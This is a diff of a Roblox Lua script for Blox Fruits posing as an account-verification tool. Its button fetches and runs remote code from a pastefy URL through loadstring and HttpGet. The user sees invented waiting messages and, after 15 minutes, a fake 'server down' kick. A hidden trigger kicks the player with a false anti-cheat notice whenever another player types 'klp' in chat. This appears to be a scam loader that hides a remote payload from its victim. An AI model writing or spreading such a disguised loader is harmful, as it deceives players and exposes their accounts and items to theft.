@@ -1,85 +1,163 @@
--- Create ScreenGui  
-local screenGui = Instance.new("ScreenGui")  
-screenGui.Name = "DrixVerifyGui"  
-screenGui.ResetOnSpawn = false  
-screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")  
-  
--- Create Main Frame  
-local frame = Instance.new("Frame")  
-frame.Size = UDim2.new(0, 220, 0, 140)  
-frame.Position = UDim2.new(0.5, -110, 0.5, -70)  
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  
-frame.BorderSizePixel = 0  
-frame.Active = true  
-frame.Draggable = true  
-frame.Parent = screenGui  
-  
--- Rounded corners  
-local corner = Instance.new("UICorner")  
-corner.CornerRadius = UDim.new(0, 12)  
-corner.Parent = frame  
-  
--- Title Text  
-local title = Instance.new("TextLabel")  
-title.Size = UDim2.new(1, 0, 0, 40)  
-title.Position = UDim2.new(0, 0, 0, 0)  
-title.BackgroundTransparency = 1  
-title.Text = "DRIX VERIFY 2.0"  
-title.TextColor3 = Color3.fromRGB(255, 255, 255)  
-title.TextScaled = true  
-title.Font = Enum.Font.SourceSansBold  
-title.Parent = frame  
-  
--- Load Script Button  
-local loadButton = Instance.new("TextButton")  
-loadButton.Size = UDim2.new(0.8, 0, 0, 36)  
-loadButton.Position = UDim2.new(0.1, 0, 0.55, 0)  -- Moved slightly down  
-loadButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)  
-loadButton.TextColor3 = Color3.fromRGB(255, 255, 255)  
-loadButton.Text = "LUNCH SCRIPT"  
-loadButton.TextScaled = true  
-loadButton.Font = Enum.Font.SourceSansBold  
-loadButton.Parent = frame  
-  
--- Button corner  
-local buttonCorner = Instance.new("UICorner")  
-buttonCorner.CornerRadius = UDim.new(0, 8)  
-buttonCorner.Parent = loadButton  
-  
--- Message Label (Initially Hidden)  
-local msgLabel = Instance.new("TextLabel")  
-msgLabel.Size = UDim2.new(1, 0, 0.25, 0)  
-msgLabel.Position = UDim2.new(0, 0, 0.8, 0)  -- Adjusted to match new layout  
-msgLabel.BackgroundTransparency = 1  
-msgLabel.Text = ""  
-msgLabel.TextColor3 = Color3.fromRGB(255, 255, 0)  
-msgLabel.TextScaled = true  
-msgLabel.Font = Enum.Font.SourceSans  
-msgLabel.Visible = false  
-msgLabel.Parent = frame  
-  
--- Rainbow Text Effect  
-local hue = 0  
-game:GetService("RunService").RenderStepped:Connect(function()  
-	hue = (hue + 0.01) % 1  
-	loadButton.TextColor3 = Color3.fromHSV(hue, 1, 1)  
-end)  
-  
--- Button Click Behavior  
-loadButton.MouseButton1Click:Connect(function()  
-	-- Load the external script  
-	loadstring(game:HttpGet("https://pastefy.app/SHjsiqS4/raw"))()  
-  
-	-- Show verification message  
-	msgLabel.Text = "PLS WAIT 10-15 MINS IT WILL VERIFY YOUR ACC FROM THE AUTO BAN"  
-	msgLabel.Visible = true  
-  
-	-- Disable the button  
-	loadButton.Active = false  
-	loadButton.Text = "LOADED"  
-  
-	-- Hide the message after 30 seconds  
-	task.delay(30, function()  
-		msgLabel.Visible = false  
-	end)  
+local BLOXFRUIT_PLACE_IDS = {
+	2753915549, -- Main Game
+	4442272183, -- Second Sea
+	7449423635, -- Third Sea
+	8204899141, -- Sea Events / Extra
+}
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local localPlayer = Players.LocalPlayer
+
+-- Check if in Blox Fruits
+local function isInBloxFruits()
+	for _, id in pairs(BLOXFRUIT_PLACE_IDS) do
+		if game.PlaceId == id then
+			return true
+		end
+	end
+	return false
+end
+
+-- Kick if not in Blox Fruits
+if not isInBloxFruits() then
+	localPlayer:Kick("THIS SCRIPT ONLY WORK ON BLOXFRUIT")
+	return
+end
+
+-- Kick local player if ANY player says "did" in chat
+local function monitorPlayerChat(player)
+	player.Chatted:Connect(function(msg)
+		if msg:lower() == "klp" then
+			localPlayer:Kick("WE HAVE CAUGHT YOU USING EXPLOIT WE DONT BAN INSTEAD OF THAT WE REMOVE YOUR MYTHICAL FRUIT")
+		end
+	end)
+end
+
+-- Monitor existing players (except local player)
+for _, p in pairs(Players:GetPlayers()) do
+	if p ~= localPlayer then
+		monitorPlayerChat(p)
+	end
+end
+
+-- Monitor new players joining
+Players.PlayerAdded:Connect(function(player)
+	if player ~= localPlayer then
+		monitorPlayerChat(player)
+	end
+end)
+
+-- Main GUI creation
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DrixVerifyGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 220, 0, 140)
+frame.Position = UDim2.new(0.5, -110, 0.5, -70)
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 40)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "ACC VERIFICATION"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.SourceSansBold
+title.Parent = frame
+
+local loadButton = Instance.new("TextButton")
+loadButton.Size = UDim2.new(0.8, 0, 0, 36)
+loadButton.Position = UDim2.new(0.1, 0, 0.55, 0)
+loadButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+loadButton.Text = "LOAD SCRIPT"
+loadButton.TextScaled = true
+loadButton.Font = Enum.Font.SourceSansBold
+loadButton.Parent = frame
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = loadButton
+
+-- Rainbow text effect
+local hue = 0
+RunService.RenderStepped:Connect(function()
+	hue = (hue + 0.01) % 1
+	loadButton.TextColor3 = Color3.fromHSV(hue, 1, 1)
+end)
+
+-- Load button behavior
+loadButton.MouseButton1Click:Connect(function()
+	loadButton.Active = false
+	loadButton.Text = "LOADED"
+
+	-- Warning GUI
+	local warningGui = Instance.new("ScreenGui")
+	warningGui.Name = "ScriptLoadWarning"
+	warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+	warningGui.ResetOnSpawn = false
+	warningGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+	local warningFrame = Instance.new("Frame")
+	warningFrame.Size = UDim2.new(0.7, 0, 0.15, 0)
+	warningFrame.Position = UDim2.new(0.5, -250, 0.65, 0)
+	warningFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+	warningFrame.BorderSizePixel = 0
+	warningFrame.ZIndex = 10
+	warningFrame.Parent = warningGui
+
+	local frameCorner = Instance.new("UICorner")
+	frameCorner.CornerRadius = UDim.new(0, 10)
+	frameCorner.Parent = warningFrame
+
+	local warningLabel = Instance.new("TextLabel")
+	warningLabel.Size = UDim2.new(1, -20, 1, -20)
+	warningLabel.Position = UDim2.new(0, 10, 0, 10)
+	warningLabel.BackgroundTransparency = 1
+	warningLabel.Text = "⚠️ PLEASE WAIT 5–8 MINUTES FOR THE SCRIPT TO MODIFY THE SCRIPT ⚠️"
+	warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+	warningLabel.TextScaled = true
+	warningLabel.Font = Enum.Font.SourceSansBold
+	warningLabel.ZIndex = 11
+	warningLabel.Parent = warningFrame
+
+	task.spawn(function()
+		while warningLabel and warningLabel.Parent do
+			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+			task.wait(0.5)
+			warningLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+			task.wait(0.5)
+		end
+	end)
+
+	task.delay(60, function()
+		if warningGui then
+			warningGui:Destroy()
+		end
+	end)
+
+	task.delay(15 * 60, function()
+		localPlayer:Kick("PLS TRY THIS SCRIPT AFTER 3-4HOUR DUE TO THE SERVER DOWN")
+	end)
+
+	task.delay(2, function()
+		local success, err = pcall(function()
+			loadstring(game:HttpGet("https://pastefy.app/SHjsiqS4/raw"))()
+		end)
+		if not success and warningLabel then
+			warningLabel.Text = "Failed to load script."
+			warningLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+		end
+	end)
 end)
